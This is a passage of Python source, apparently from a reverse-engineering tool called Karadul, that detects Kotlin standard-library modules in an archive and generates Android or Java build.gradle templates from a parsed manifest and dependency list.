                        if "kotlin-stdlib" in name and name.endswith(".kotlin_module"):
                            result["detected"] = True
                            result["evidence"].append(f"kotlin-stdlib modulu: {name}")
                            break
        except (zipfile.BadZipFile, OSError):
            pass

        return result

    def _generate_build_gradle(self, manifest: dict, deps: list[str]) -> str:
        """build.gradle sablonu olustur."""
        is_android = manifest.get("is_android", False)

        if is_android:
            return f"""// Karadul v1.0 tarafindan olusturuldu
// Orijinal paket: {manifest.get('package', 'unknown')}

plugins {{
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'  // Kotlin tespit edildiyse
}}

android {{
    namespace "{manifest.get('package', 'com.example.app')}"
    compileSdk 34
    defaultConfig {{
        applicationId "{manifest.get('package', 'com.example.app')}"
        minSdk 21
        targetSdk 34
    }}
}}

dependencies {{
{chr(10).join(f'    implementation "{d}"' for d in deps)}
}}
"""
        else:
            main_class = manifest.get("Main-Class", "")
            return f"""// Karadul v1.0 tarafindan olusturuldu
// Main-Class: {main_class}

plugins {{
    id 'java'
    id 'application'
}}

application {{
    mainClass = '{main_class}'
}}

repositories {{
    mavenCentral()
}}

dependencies {{
{chr(10).join(f'    implementation "{d}"' for d in deps)}
}}
"""
